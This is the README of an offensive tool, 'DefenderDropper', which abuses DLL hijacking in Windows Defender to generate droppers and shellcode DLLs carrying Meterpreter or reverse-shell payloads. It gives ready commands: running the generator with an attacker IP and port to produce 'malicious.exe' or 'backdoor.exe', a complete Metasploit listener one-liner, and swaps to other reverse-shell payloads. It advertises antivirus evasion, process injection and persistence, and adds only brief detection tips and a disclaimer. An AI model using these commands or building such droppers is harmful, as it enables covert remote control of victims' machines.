#  DefenderDropper

**Advanced DLL Hijacking Payload Generator Using Windows Defender Vulnerabilities**

![Banner](assets/banner.jpg)
[![Python](https://img.shields.io/badge/Python-3.6%2B-blue)](https://python.org)
[![Metasploit](https://img.shields.io/badge/Metasploit-Compatible-red)](https://metasploit.com)
[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)

##  Overview

DefenderDropper is an advanced payload generation tool that leverages the DLL hijacking vulnerability in Windows Defender, originally discovered by [TwoSevenOneT](https://github.com/TwoSevenOneT/DefenderWrite). This tool automates the creation of sophisticated payloads that bypass security controls by hijacking legitimate Windows Defender processes.

>  **Inspired by**: [TwoSevenOneT/DefenderWrite](https://github.com/TwoSevenOneT/DefenderWrite)

##  Features

- **Windows Defender Exploitation**: Leverages DLL hijacking in Windows Defender
- **Automated Payload Generation**: Creates ready-to-use droppers and DLLs
- **Metasploit Integration**: Seamless integration with Meterpreter payloads
- **Static Compilation**: No external dependencies required
- **Stealth Execution**: Runs through legitimate system processes
- **Multiple Payload Support**: Various reverse shell and Meterpreter options

##  Quick Start

### Prerequisites

```bash
# Install dependencies on Debian/Kali
sudo apt update
sudo apt install python3 metasploit-framework mingw-w64 -y
```
# Installation
```bash
git clone https://github.com/HackScaleTeam/DefenderDropper.git
cd DefenderDropper
```

# Generate payload
```
python3 defenderdropper.py 10.0.2.147 4443 -o malicious.exe
```
# Start Metasploit listener
```
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 10.0.2.147; set LPORT 4443; exploit'
```

# How It Works
Technical Overview
DLL Hijacking: Exploits Windows Defender's vulnerable update process

Process Injection: Injects shellcode into legitimate system processes

Persistence: Leverages trusted Windows components for execution

Evasion: Bypasses common security controls and antivirus solutions

# Attack Flow

![Banner](assets/digram.png)


# File Structure
```
DefenderDropper/
├── defenderdropper.py    # Main payload generator
├── payload.exe           # Generated dropper
├── payload.dll           # Shellcode DLL
├── DefenderWrite.exe     # Core exploit tool
├── README.md
└── LICENSE
```
# Usage Examples
Basic Meterpreter Payload
```bash
python3 defenderdropper.py 192.168.1.100 4444 -o backdoor.exe
```


# Advanced Features
Custom Payloads

You can modify the generate_shellcode() function to use different Metasploit payloads, on defenderdropper.py search for windows/x64/meterpreter_reverse_tcp and replace it with other payloads:

```
"-p", "windows/x64/shell_reverse_tcp",  # Simple reverse shell
"-p", "windows/meterpreter/reverse_https",  # HTTPS payload
"-p", "windows/x64/meterpreter/reverse_tcp",  # Standard Meterpreter
```

# Defense & Mitigation
Detection
Monitor for unusual msiexec.exe child processes

Watch for DLL files in Windows Defender directory

Analyze process hollowing techniques

# Prevention
Keep Windows Defender updated

Implement application whitelisting

Use advanced endpoint protection

Regular security audits

# Legal Disclaimer
This tool is intended for:

 Security research

 Penetration testing with proper authorization

 Educational purposes

 Red team exercises

 Illegal use of this tool is strictly prohibited. The developers are not responsible for any misuse or damage caused by this tool. Always ensure you have explicit permission before testing any systems.

# Contributing
We welcome contributions from the security community! Feel free to:

Fork the repository

Create feature branches

Submit pull requests

Report issues and suggestions

# Special Thanks
TwoSevenOneT for the original DefenderWrite research

The cybersecurity community for continuous improvement

# License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/HackScaleTeam/DefenderDropper/LICENSE). file for details.

 Security is a shared responsibility. Use this tool wisely and ethically.

Built with ❤️ for the cybersecurity community. Inspired by groundbreaking research from TwoSevenOneT.
